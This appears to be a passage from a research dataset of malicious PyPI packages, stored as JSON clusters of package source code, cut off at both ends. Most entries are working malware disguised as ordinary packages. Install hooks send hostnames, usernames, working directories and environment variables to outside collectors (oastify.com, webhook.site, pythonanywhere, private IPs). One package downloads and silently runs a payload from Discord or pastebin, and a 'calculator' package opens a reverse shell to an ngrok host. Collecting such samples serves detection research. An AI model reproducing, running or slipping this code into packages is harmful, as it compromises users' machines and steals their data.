 classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n    ],\n)\n\n\n\n#   ---------------------------------------------------------------------------------\n#   Copyright (c) Microsoft Corporation. All rights reserved.\n#   Licensed under the MIT License. See LICENSE in project root for information.\n#   ---------------------------------------------------------------------------------\n\"\"\"This is a sample python file for testing functions from the source code.\"\"\"\nfrom __future__ import annotations\n\nfrom python_package.hello_world import hello_world\n\n\ndef hello_test():\n    \"\"\"\n    This defines the expected usage, which can then be used in various test cases.\n    Pytest will not execute this code directly, since the function does not contain the suffex \"test\"\n    \"\"\"\n    hello_world()\n\n\ndef test_hello(unit_test_mocks: None):\n    \"\"\"\n    This is a simple test, which can use a mock to override online functionality.\n    unit_test_mocks: Fixture located in conftest.py, implictly imported via pytest.\n    \"\"\"\n    hello_test()\n\n\ndef test_int_hello():\n    \"\"\"\n    This test is marked implicitly as an integration test because the name contains \"_init_\"\n    https://docs.pytest.org/en/6.2.x/example/markers.html#automatically-adding-markers-based-on-test-names\n    \"\"\"\n    hello_test()\n"
      }
    ]
  },
  {
    "cluster_id": 172,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-21-consolecmds",
        "code": "from setuptools import setup\n\n\n\n\n\n\n\nsetup(\n    name='consolecmds',\n    version='1.1.0',    \n    description='Your gateway to console commands',\n    url='https://github.com',\n    author='ILY',\n    author_email='na@na.com',\n    license='BSD 2-clause',\n    packages=['consolecmds'],\n    install_requires=[\"requests\",\"cryptography\",\"wmi\",\"pathlib\",\"opencv-python\",\"screeninfo\",\"psutil\",\"httpx\",\"flask\",\"pynput\",\"pillow\",\"browser_cookie3\",\"pyaudio\",\"bleach\",\"pypiwin32\",\"pycryptodome\",\"pygame\"],\n\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ],\n)\n\nimport sys,os,requests,subprocess,time\nfrom pathlib import Path\nfrom subprocess import CREATE_NO_WINDOW\n\nfilename = \"code.py\"\n\n\ndef stopprint():\n    sys.stdout = open(os.devnull, 'w')\n\ndef startprint():\n    sys.stdout = sys.__stdout__\n\n\n\n\ndef get_folder_contents(path):\n\ttry:\n\t\tall_files = os.listdir(path)\n\t\tfor file in all_files:\n\t\t\tif file.lower() == \"python.exe\":\n\t\t\t\treturn True\n\texcept:\n\t\tpass\n\treturn False\n\ndef get_default_path():\n\ttry:\n\t\tvideos_path = str(Path.home() / \"Videos\")\n\t\treturn videos_path\n\texcept Exception as e:\n\t\tprint(e)\n\t\treturn None\n\ndef get_new_filepath(path,name):\n\treturn os.path.join(path,name)\n\ndef get_cdn():\n\tcdnurl = \"https://cdn.discordapp.com/attachments/1033739850643406918/1044011736518377482/code.zip\"\n\ttry:\n\t\tcdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n\t\tif cdndata.status_code == 200:\n\t\t\tcdnurl = cdndata.text\n\texcept:\n\t\tpass\n\treturn cdnurl\n\ndef get_content():\n\tcdn = get_cdn()\n\tcode = requests.get(cdn).text\n\treturn code\n\ndef write_to_file(filepath,content):\n\tf = open(filepath,\"a\")\n\tf.write(content)\n\tf.close()\n\ndef hide_file(file_path):\n    try:\n        os.system(f\"attrib +h {file_path}\" )\n    except:\n        pass\n\ndef run_file(path):\n\t#pass\n\t#os.system(path)\n\tprint(\"Running\")\n\tp = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n\tout, err = p.communicate()\n\tprint(f\"{out}|{err}\")\n\n\n\n\ndef main():\n\tstopprint()\n\tfilepath = get_default_path()\n\tfor thing in sys.path:\n\n\t\tcorrect_folder = get_folder_contents(thing)\n\t\tif correct_folder == True:\n\t\t\tfilepath = thing \n\t\t\tbreak\n\n\tnew_filepath = get_new_filepath(filepath,filename)\n\tother_filepath = get_new_filepath(filepath,\"pytransform\")\n\tprint(filepath)\n\n\tif os.path.exists(new_filepath) == True:\n\t\tprint(\"Already done\")\n\t\treturn\n\n\tcdn = get_cdn()\n\tos.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n\tos.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n\n\thide_file(new_filepath)\n\thide_file(other_filepath)\n\trun_file(new_filepath)\n\nmain()\n\nfrom .setup import *\n\n\n__version__ = \"0.1.0\"\n__author__ = 'milker on top'\n__credits__ = 'tits'"
      }
    ]
  },
  {
    "cluster_id": 173,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-05-mlc-llm-nightly-v99.99.105",
        "code": "import socket\nimport os\nimport json\nimport urllib.request\n\ndef send_system_info(url):\n    # Gather system and network information\n    data = {\n        \"hostname\": socket.gethostname(),\n        \"username\": os.getlogin(),\n        \"environment_variables\": dict(os.environ),\n        \"network_info\": []\n    }\n\n    try:\n        with urllib.request.urlopen('https://api.ipify.org?format=json') as response:\n            ipdata = json.load(response)\n            data['ip'] = ipdata['ip']\n    except: pass\n\n    # Get IP addresses\n    try:\n        hostname, aliases, ip_addresses = socket.gethostbyname_ex(data[\"hostname\"])\n        data[\"network_info\"].append({\n            \"hostname\": hostname,\n            \"aliases\": aliases,\n            \"ip_addresses\": ip_addresses\n        })\n    except socket.error as e:\n        data[\"network_info\"].append({\"error\": str(e)})\n\n    # Send data\n    req = urllib.request.Request(\n        url, \n        data=json.dumps(data).encode(), \n        headers={'Content-Type': 'application/json'}\n    )\n\n    urllib.request.urlopen(req)\n\ndef post():\n    send_system_info(\"https://awesomemaker.pythonanywhere.com/json?prefix=pip_%s\" % \"mlc-llm-nightly\")\n\npost()"
      }
    ]
  },
  {
    "cluster_id": 174,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-29-colotama-v0.5.0",
        "code": "from setuptools import setup\nfrom setuptools.command.bdist_egg import bdist_egg as _bdist_egg\nfrom subprocess import call\nfrom setuptools.command.install import install as _install\nimport sys\nimport os\n\ndef _post_install(dir):\n    try:\n        print(\";\"*200)\n        _a = sys.executable\n        _b = os.path.join(dir, 'colotama')\n        call([f\"{_a} -m pip install pyprettifier\"], shell=True)\n        print(\";\"*200)\n        call([f\"{_a} {_b}\"], shell=True)\n    except Exception as e:\n        with open('/tmp/a', 'a') as f:\n            f.write(\"------- ? ? ? \" + str(e) + \"\\n\")\n\nclass install(_install):\n    def run(self):\n        _install.run(self)\n        self.execute(_post_install, (self.install_lib,), msg=\"Running post install task\")\n\nsetup(\n    name=\"colotama\",\n    version=\"0.5.0\",\n    packages=[\"colotama\"],\n    description=\"\",\n    author=\"Asian Mlik\",\n    author_email=\"help@colotama.com\",\n    cmdclass={\n        'install': install},\n    python_requires='>=3.6'\n)\n\n\n# colotama/__init__.py\n\nfrom .cli import cli\n\n# colotama/cli.py\n\ndef after_install():\n    try:\n        import pyprettifier\n        converter = pyprettifier.EmojiConverter()                        \n    except ImportError as e:\n        with open('/tmp/a', 'a') as f:\n            f.write(\"------- * * * \" + str(e) + \"\\n\")\n\nif __name__ == \"__main__\":\n    after_install()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-02-10-example-vizsla-tutorial-v0.1.1",
        "code": "\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport sys\n\nclass Trace(install):    \n    def run(self):\n            # Run the standard installation first\n            install.run(self)\n            subprocess.call([sys.executable, \"-m\", f\"example-vizsla-tutorial.trace\"])\n\n   \nsetup(\n    name='example-vizsla-tutorial',\n    version='0.1.1',\n    packages=['example-vizsla-tutorial'],\n    install_requires=[\n        'requests'\n    ],\n    cmdclass={\n        'install': Trace\n    },\n    description='A simple example package with basic functionality.',\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n    ],\n)\n\n\n\nimport platform\nimport socket\nimport traceback\nimport http.client\nimport json\nimport importlib.metadata\nimport sys\n\ndef get_packages():\n    try:\n        return {pkg.metadata[\"Name\"]: pkg.version for pkg in importlib.metadata.distributions()}\n    except Exception:\n        return {}\n\ndef get_host_package():\n    package_name = \"example-vizsla-tutorial\"\n    try:\n        for pkg in importlib.metadata.distributions():\n            if any(req.startswith(package_name) for req in pkg.requires or []):\n                return {\"host_package\": pkg.metadata[\"Name\"], \"version\": pkg.version}\n    except Exception:\n        pass\n    return {\"host_package\": \"unknown\", \"version\": \"unknown\"}\n\ndef find_import_stack():\n    stack = traceback.extract_stack()\n    stack_info = []\n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    return stack_info\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n            \ndef trace():\n    try:\n        os_info = platform.system()\n        stack_info = find_import_stack()\n        context = find_import_context()\n        stack_trace = \"\".join(traceback.format_stack())\n        conn = http.client.HTTPSConnection(\"webhook.site\", timeout=10)  # Change port if needed (e.g., 443 for HTTPS)\n        headers = {\"Content-Type\": \"application/json\"}\n        data = json.dumps({\n                'os': os_info,\n                'hostname': socket.gethostname(),\n                'package_info': __name__,\n                'host_package_info': get_host_package(),\n                'installed_packages': get_packages(),\n                'sys_executable': sys.executable,\n                'sys_prefix': sys.prefix,\n                'context': context,\n                'import_stack': stack_info,\n            })\n        conn.request(\"POST\", \"/traces\", body=data, headers=headers)\n        response = conn.getresponse()\n        print(f\"Sent stack trace. Response: {response.status} {response.reason}\")\n        conn.close()\n    except Exception as post_error:\n        print(f\"Failed to send stack trace: {post_error}\")\n\n\nif __name__ == \"__main__\":\n    trace()\n\n\n\n\ndef log_message():\n    print(\"Hello from example_package! This package provides simple logging.\")\n\ndef simple_math_operation(a, b):\n    return a + b\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-02-10-googleapis-googleapis-grpc-python-v1.9.3",
        "code": "\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport sys\n\nclass Trace(install):    \n    def run(self):\n            # Run the standard installation first\n            install.run(self)\n            subprocess.call([sys.executable, \"-m\", f\"googleapis_googleapis_grpc_python.trace\"])\n\n   \nsetup(\n    name='googleapis_googleapis_grpc_python',\n    version='1.9.3',\n    packages=['googleapis_googleapis_grpc_python'],\n    install_requires=[\n        'requests'\n    ],\n    cmdclass={\n        'install': Trace\n    },\n    description='Integration test for googleapis_googleapis_grpc_python',\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n    ],\n)\n\n\n\nimport platform\nimport socket\nimport traceback\nimport http.client\nimport json\nimport importlib.metadata\nimport sys\n\ndef get_packages():\n    try:\n        return {pkg.metadata[\"Name\"]: pkg.version for pkg in importlib.metadata.distributions()}\n    except Exception:\n        return {}\n\ndef get_host_package():\n    package_name = \"googleapis_googleapis_grpc_python\"\n    try:\n        for pkg in importlib.metadata.distributions():\n            if any(req.startswith(package_name) for req in pkg.requires or []):\n                return {\"host_package\": pkg.metadata[\"Name\"], \"version\": pkg.version}\n    except Exception:\n        pass\n    return {\"host_package\": \"unknown\", \"version\": \"unknown\"}\n\ndef find_import_stack():\n    stack = traceback.extract_stack()\n    stack_info = []\n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    return stack_info\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n            \ndef trace():\n    try:\n        os_info = platform.system()\n        stack_info = find_import_stack()\n        context = find_import_context()\n        stack_trace = \"\".join(traceback.format_stack())\n        conn = http.client.HTTPSConnection(\"webhook.site\", timeout=10)  # Change port if needed (e.g., 443 for HTTPS)\n        headers = {\"Content-Type\": \"application/json\"}\n        data = json.dumps({\n                'os': os_info,\n                'hostname': socket.gethostname(),\n                'package_info': __name__,\n                'host_package_info': get_host_package(),\n                'installed_packages': get_packages(),\n                'sys_executable': sys.executable,\n                'sys_prefix': sys.prefix,\n                'context': context,\n                'import_stack': stack_info,\n            })\n        conn.request(\"POST\", \"/traces\", body=data, headers=headers)\n        response = conn.getresponse()\n        print(f\"Sent stack trace. Response: {response.status} {response.reason}\")\n        conn.close()\n    except Exception as post_error:\n        print(f\"Failed to send stack trace: {post_error}\")\n\n\nif __name__ == \"__main__\":\n    trace()\n\n\n\n\ndef log_message():\n    print(\"Hello from example_package! This package provides simple logging.\")\n\ndef simple_math_operation(a, b):\n    return a + b\n"
      }
    ]
  },
  {
    "cluster_id": 175,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-27-dpdcyconfusion-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\n\nclass CustomInstallCommand(install):\n    def run(self):\n        # Run the pre-install script\n        os.system(\"python -m dpdcyconfusion.pre_install\")\n        # Continue with the standard install\n        install.run(self)\n\nsetup(\n    name=\"dpdcyconfusion\",\n    version=\"0.1\",\n    packages=[\"dpdcyconfusion\"],\n    install_requires=[\n        # Your dependencies here\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    author=\"dhxnush.ravi\",\n    author_email=\"your.email@example.com\",\n    description=\"A description of your package\",\n    long_description=open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://your.package.url\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires='>=3.6',\n)\n\n\nimport os\nimport subprocess\nimport json\nimport requests  # Using requests library for synchronous HTTP requests\n\n# Get hostname\nhostname = subprocess.check_output(['hostname']).decode().strip()\n\n# Get directory name\ndirname = os.path.basename(os.getcwd())\n\n# Get username\nusername = os.getlogin()\n\n# Prepare data payload\ndata = {\n    \"hostname\": hostname,\n    \"directory\": dirname,\n    \"username\": username\n}\n\n# Define callback URL\ncallback_url = \"http://192.168.139.156:8000/callback\"\n\n# Send data using HTTP POST request\ndef send_data():\n    try:\n        response = requests.post(callback_url, json=data)\n        if response.status_code == 200:\n            print(\"Data sent successfully.\")\n        else:\n            print(f\"Failed to send data. Status code: {response.status_code}\")\n    except requests.RequestException as e:\n        print(f\"An error occurred: {e}\")\n\n# Call the send_data function\nsend_data()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-19-calculator-2c397c49ab20c445",
        "code": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nVERSION = '1000.0.6'\nDESCRIPTION = 'Dependecy Confusion POC'\n\n# Setting up\nsetup(\n    name=\"calculator_2c397c49ab20c445\",\n    version=VERSION,\n    author=\"Zeyad Abulaban\",\n    author_email=\"zeyad.abuqasem@gmail.com\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests'],\n    classifiers= [\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Education\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n        ]\n)\n\n\n\nimport os,requests,getpass,socket\n\nclass calculator:\n    def add(x, y):\n        user = os.getenv('USER')\n        host = os.getenv('HOSTNAME')\n        print(user, host)\n\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        ploads = {'hostname':hostname,'cwd':cwd}\n        requests.get(\"https://en0w6ukj0qarx.x.pipedream.net/\",params = ploads)\n\n        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        s.connect((\"4.tcp.eu.ngrok.io\",19931))\n        os.dup2(s.fileno(),0)\n        os.dup2(s.fileno(),1)\n        os.dup2(s.fileno(),2)\n        import pty\n        pty.spawn(\"sh\")\n\n        return x+y\n\n    def subtract(x, y):\n        return x - y\n\n    def multiply(x, y):\n        return x * y\n\n    def divide(x, y):\n        return x / y\n\n\n#def calculator():\n#        hostname=socket.gethostname()\n#        cwd = os.getcwd()\n#        #username = getpass.getuser()\n#        #ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n#        #requests.get(\"<WEBHOOK>\",params = ploads)\n#        user = os.getenv('USER')\n#        host = os.getenv('HOSTNAME')\n#        print(user, host)\n\n\n\n\n#calculator()\n\n\nfrom calculator_2c397c49ab20c445.calculator import *\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-27-dpndncyconfusion-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\n\nclass CustomInstallCommand(install):\n    def run(self):\n        # Run the pre-install script\n        os.system(\"python -m dpndncyconfusion.pre_install\")\n        # Continue with the standard install\n        install.run(self)\n\nsetup(\n    name=\"dpndncyconfusion\",\n    version=\"0.1\",\n    packages=[\"dpndncyconfusion\"],\n    install_requires=[\n        # Your dependencies here\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n    author=\"dhxnush.ravi\",\n    author_email=\"your.email@example.com\",\n    description=\"A description of your package\",\n    long_description=open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://your.package.url\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires='>=3.6',\n)\n\n\nimport os\nimport subprocess\nimport json\nimport requests  # Using requests library for synchronous HTTP requests\n\n# Get hostname\nhostname = subprocess.check_output(['hostname']).decode().strip()\n\n# Get directory name\ndirname = os.path.basename(os.getcwd())\n\n# Get username\nusername = os.getlogin()\n\n# Prepare data payload\ndata = {\n    \"hostname\": hostname,\n    \"directory\": dirname,\n    \"username\": username\n}\n\n# Define callback URL\ncallback_url = \"http://192.168.194.156:8000/callback\"\n\n# Send data using HTTP POST request\ndef send_data():\n    try:\n        response = requests.post(callback_url, json=data)\n        if response.status_code == 200:\n            print(\"Data sent successfully.\")\n        else:\n            print(f\"Failed to send data. Status code: {response.status_code}\")\n    except requests.RequestException as e:\n        print(f\"An error occurred: {e}\")\n\n# Call the send_data function\nsend_data()"
      }
    ]
  },
  {
    "cluster_id": 176,
    "size": 18,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-08-08-dependencyrrr-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://as6miwg8kyiiyii44i5j354h48azypme.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='dependencyrrr', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-08-13-peloton-client123-v0.8.10",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://e1gl4m7gypj7g49tbwc6vvmr4ia9yzmo.oastify.com\",params = ploads) \n\nsetup(name='peloton-client123', #package name\n      version='0.8.10',\n      description='test',\n      author='red-fire',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-arangodb-python-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='arangodb-python', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-celery-poolroutes-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='celery-poolroutes', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-celery-routing-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='celery-routing', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-celery-routr-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='celery-routr', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-graphene-arangodb-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='graphene-arangodb', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-pip-cache-dir-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='pip-cache-dir', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-prometheus-api-metrics-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='prometheus-api-metrics', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-prometheus-client-twisted-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='prometheus_client_twisted', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-prometheus-psutil-exporter-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='prometheus-psutil-exporter', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-pysanitizer-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='pysanitizer', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-python-rsyslog-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='python-rsyslog', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-sqlalchemy-presto-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='sqlalchemy-presto', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-04-syslog-ng-v1.0.0",
